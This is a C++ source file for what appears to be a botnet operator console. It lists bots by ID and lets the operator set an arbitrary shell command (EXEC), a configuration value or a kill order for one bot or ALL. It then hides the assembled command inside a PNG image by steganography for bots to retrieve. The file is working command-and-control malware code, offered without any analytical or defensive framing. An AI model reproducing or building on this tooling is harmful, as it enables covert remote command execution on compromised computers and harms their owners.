#include "cli.h"

    void cli::setAttr (cli *cliInstance){
            if(cliInstance->input[1] == "ID"){
                cliInstance->id.clear();
                //Validate argument is available
                if(cliInstance->input.size() <3){
                    return;
                }
                if(cliInstance->input[2] == "ALL"){
                    cliInstance->id = "ALL";
                }else{
                    //Dont feel like using regex to validate user input for stoi and find, just ganna catch any exceptions
                    try{
                        cliInstance->id = bots.find(stoi(cliInstance->input[2]))->second;
                    }catch(const std::invalid_argument &e){
                        std::cout << "Error,Invalid argument for ID. ID must be an integer" << std::endl;
                    }
                }
            }else if(cliInstance->input[1] == "EXEC"){
                //For statement to store entire command in EXEC.
                cliInstance->Exec.clear();
                for (int i = 2; i < cliInstance->input.size(); i++){
                  cliInstance->Exec += cliInstance->input[i] + " ";
                }
            }else if(cliInstance->input[1] == "CONF"){
                cliInstance->Conf.clear();
                if(cliInstance->input.size() <3){
                    return;
                }
                cliInstance->Conf = cliInstance->input[2];
            }else if(cliInstance->input[1]== "KILL"){
                cliInstance->Kill.clear();
                if(cliInstance->input.size() <3){
                    return;
                }
                cliInstance->Kill = cliInstance->input[2];
            }else{
                std::cout << "Error: Invalid Command" << std::endl;

            }
    }

    void cli::showInfo (cli *cliInstance){
        std::cout <<
            "COMMAND            REQUIRED           VALUE      \n"
            "-------            ------            ------      \n"
            "KILL               NOT REQUIRED        "+ cliInstance->Kill + " \n"
            "CONF               NOT REQUIRED        "+ cliInstance->Conf + " \n"
            "EXEC               NOT REQUIRED        "+ cliInstance->Exec + " \n"
            "ID                 REQUIRED            "+ cliInstance->id +   " \n";
    }
    void cli::runCommand (cli *cliInstance){
         std::string commandParser = "<COM";
            //Validate ID was set
            if(!cliInstance->id.empty()){
                commandParser.append(":");
                commandParser.append(cliInstance->id);
            }else{
                fprintf(stdout,"Error: ID Required\n");
                return;
            }
            if(!cliInstance->Exec.empty()){
                commandParser.append(":4-");
                commandParser.append(cliInstance->Exec);
            }
            if(!cliInstance->Conf.empty()){
                commandParser.append(":1-");
                commandParser.append(cliInstance->Conf);
            }
            if(!cliInstance->Kill.empty()){
                commandParser.append(":");
                commandParser.append("0-0");
            }
            commandParser.append(">");
            std::string dImage = "images/defaultR.png";                  
            std::string wImage = "images/tree.png"; 
            stegImage encodeImage;
            encodeImage.readPNG(&dImage);  
            encodeImage.encodeImage(commandParser); 
            encodeImage.writePNG(&wImage);
    }
   void cli::showBots(cli *cliInstance){
        if(bots.empty()){
            std::cout << "Bots: 0" << std::endl;
        }else{
            std::cout << "Bots: " << bots.size() << std::endl;
            std::map<int,std::string>::iterator it = bots.begin();
            std::cout << "ID" << "              " << "UID" << std::endl;
            std::cout << "--" << "              " << "---" << std::endl;

            while(it != bots.end()){
                std::cout << it->first << ":              "<< it->second << std::endl;
                it++;
            }
        }
    
    }
    

    void cli::call_command(cli *cliInstance){
        auto iter = cliInstance->map.find(cliInstance->input[0]);
        //If valid command is found, execute it
        if(iter != cliInstance->map.end()){
            (*iter->second)(cliInstance);
        }else{
            std::cout << "Error: Invalid Command" << std::endl;
        }
    }
    
    void cli::init(cli *cliInstance){
        //Initialize CLI map of function pointers
        cliInstance->map.emplace("set",&setAttr);
        cliInstance->map.emplace("show",&showInfo);
        cliInstance->map.emplace("run", &runCommand);
        cliInstance->map.emplace("bots",&showBots);
  
    }

    int cli::parseCommand(std::string command){
        std::istringstream commandInput(command);
        std::string current;
        while(getline(commandInput,current,' ')){
            this->input.push_back(current);
        }
        //Validate input is not empty
        if(this->input.empty()){
            return -1;
        }
        return 0;
    }
    
    void cli::cliPerform(cli *cliInt){
       

        while(true){
            std::string command;
            //Pull for Input
            std::getline(std::cin,command);
            //Clear Input field each iteration
            cliInt->input.clear();
            //Parse Command for fields
            if(cliInt->parseCommand(command)){
                std::cout << "Error: Invalid Syntex" << std::endl;
                cliInt->input.clear();
                continue;
            }
            cliInt->call_command(cliInt);
            cliInt->input.empty();
        }
   
    }


